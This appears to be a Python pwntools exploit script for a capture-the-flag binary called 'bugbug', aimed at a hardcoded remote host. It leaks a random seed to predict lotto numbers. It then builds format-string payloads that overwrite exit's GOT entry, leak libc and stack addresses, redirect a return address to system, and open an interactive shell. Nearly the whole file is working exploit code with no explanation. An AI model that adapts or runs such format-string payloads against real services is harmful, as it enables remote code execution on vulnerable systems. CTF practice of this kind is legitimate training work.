#!/usr/bin/env python

import ctypes
from pwn import *
from ctypes.util import find_library

DEBUG = True

libc = ctypes.CDLL (find_library ('c'))

# --------------------

def r(msg, do_print = False):
  if do_print:
    log.info (p.recvuntil (msg))
  else:
    p.recvuntil (msg)

#address
exit_addr = 0x804a024

#p = process ('./bugbug')
p = remote ("175.119.158.135", 8909)
#p = remote('localhost', 9005)

def randomval_leak (payload, second = False):
  if not second:
    r ("you? ")
  p.send (payload)
  r ("Hello~ ")
  leak = p.recvuntil ("\n")

  if DEBUG:
    log.info (leak)

  return u32 (leak [0x64: 0x68])

def solve_lotto (payload, second = False):
  randomval = randomval_leak (payload, second)
  if DEBUG:
    log.info ("Randomval: " + hex (randomval))
  libc.srand (randomval)

  v4 = [0, 0, 0, 0, 0, 0]
  do_assign = True
  for i in range (6):
    do_assign = True
    value = libc.rand () % 45 + 1

    for j in range (i):
      if v4[j] == value:
        do_assign = False

    if do_assign:
      v4[i] = value

  lotto = ''
  for x in v4:
    lotto += str (x) + " "

  lotto += ' ' * (4095 - len (lotto))

  if DEBUG:
    log.info (lotto)
  p.sendline (lotto)

# Overwrite got of exit + libc leak + stack leak
payload = p32 (exit_addr + 2) + p32 (exit_addr)
payload += ' '
payload += '%2042d %17$hn %32646d %18$hn %47$x %82$x'
#payload += '%34690d %17$n %32886d %18$n %47$x %82$x'
payload += ' '
payload += "A" * (0x64 - len (payload))

solve_lotto (payload)

r ("Congratulation, ")
format_recv = filter (lambda x: x != '', p.recvuntil ("You Win!!\n").split (" "))
log.info (format_recv)

libc_leak = int (format_recv [3], 16)
stack_leak = int (format_recv [4], 16)

#libc_base = libc_leak - 0x19a83
#system_addr = libc_base + 0x40190
#system_addr = 0xaaaaaaaa

libc_base = libc_leak - 0x1873e
system_addr = libc_base + 0x3b180


system_addr1 = system_addr % 0x10000
system_addr2 = system_addr / 0x10000

ret_addr = stack_leak - 0x704 + 0x4cc
buf_addr = stack_leak - 0x704 + 0x444

#buf_addr = libc_base + 0x160a24
buf_addr = libc_base + 0x15f61b

buf_addr1 = buf_addr % 0x10000
buf_addr2 = buf_addr / 0x10000

system_low = system_addr1 - 18
system_high = system_addr2 + 0x10000 - system_low - 18 - 2

buffer_low = buf_addr1 + 0x20000 - system_low - 18 - system_high - 4
buffer_high = buf_addr2 + 0x30000 - system_low - 18 - system_high - buffer_low - 6

if DEBUG:
  print "libc leak, libc base: ", hex (libc_leak), hex (libc_base)
  print "stack leak, ret: " + hex (stack_leak)

payload2 = p32 (ret_addr)
payload2 += p32 (ret_addr + 2)
payload2 += p32 (ret_addr + 8)
payload2 += p32 (ret_addr + 10)
payload2 += " "
payload2 += "%" + str (system_low) + "d "
payload2 += "%17$hn "
payload2 += "%" + str (system_high) + "d "
payload2 += "%18$hn "
payload2 += "%" + str (buffer_low) + "d "
payload2 += "%19$hn "
payload2 += "%" + str (buffer_high) + "d "
payload2 += "%20$hn "
payload2 += "A" * (0x64 - len (payload2))

sleep (1)
solve_lotto (payload2)


#print "puts leak: " + hex (puts_leak)

p.interactive ()

print "libc start main: " + hex (libc_leak)
print payload2

if DEBUG:
  print "hex addr ", hex(ret_addr), ", buf addr ", hex (buf_addr), "stack leak :" + hex(stack_leak), "system addr: ", hex(system_addr)
  print "system low ", hex (system_low), ", system high ", hex (system_high)
p.close ()
